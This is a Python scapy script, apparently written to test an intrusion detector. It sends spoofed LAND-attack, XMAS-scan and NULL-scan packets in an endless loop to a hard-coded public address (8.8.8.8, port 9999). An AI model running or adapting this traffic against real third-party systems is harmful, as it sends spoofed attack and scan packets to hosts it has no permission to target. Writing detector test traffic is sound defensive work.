import warnings
warnings.filterwarnings("ignore", module="cryptography")

import platform
import subprocess
import time
from scapy.all import sendp, IP, TCP, Ether, conf, getmacbyip, IFACES

# ── Use the OS routing table — deterministic, no IFACES dict ordering issues ──
def get_best_iface():
    try:
        iface_name, _, _ = conf.route.route("8.8.8.8")
        return iface_name
    except Exception:
        for guid, iface in IFACES.items():
            ip = getattr(iface, 'ip', '') or ''
            if ip and ip != '127.0.0.1' and not ip.startswith('169.254.'):
                return guid
        return conf.iface

def get_gateway_mac(ip):
    if platform.system() == "Windows":
        return getmacbyip(ip)
    else:
        subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f.readlines():
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        mac = parts[3]
                        if mac != "00:00:00:00:00:00":
                            return mac
        except Exception:
            pass
        return None

my_iface = get_best_iface()
iface_desc = getattr(IFACES.get(my_iface, None), 'description', str(my_iface))
print(f"[*] Binding to interface: {iface_desc}")

gateway_ip = conf.route.route("0.0.0.0")[2]
gateway_mac = get_gateway_mac(gateway_ip)

if not gateway_mac:
    print(f"[!] Could not resolve MAC for gateway {gateway_ip}. Exiting.")
    exit(1)

print(f"[*] Gateway: {gateway_ip} -> MAC: {gateway_mac}")

TARGET_IP = "8.8.8.8"
TARGET_PORT = 9999

print("[*] Starting Advanced Network Attacks Simulator...")
print(f"[*] Target locked: {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Firing out of interface: {iface_desc}\n")

# 1. LAND Attack  (src == dst triggers detector's LAND check)
land_packet = Ether(dst=gateway_mac) / IP(src=TARGET_IP, dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S")

# 2. XMAS Scan  (FIN+PSH+URG = 0x29)
xmas_packet = Ether(dst=gateway_mac) / IP(src="10.10.10.1", dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="FPU")

# 3. NULL Scan  (no flags = 0)
null_packet = Ether(dst=gateway_mac) / IP(src="10.10.10.2", dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="")

try:
    print("[*] Launching attacks in a loop. Press Ctrl+C to stop.")
    while True:
        # Send more packets per burst so the first TIME_WINDOW contains enough to trigger alerts
        sendp(land_packet, iface=my_iface, count=20, verbose=False)
        sendp(xmas_packet, iface=my_iface, count=20, verbose=False)
        sendp(null_packet,  iface=my_iface, count=20, verbose=False)
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[*] Attack simulator stopped.")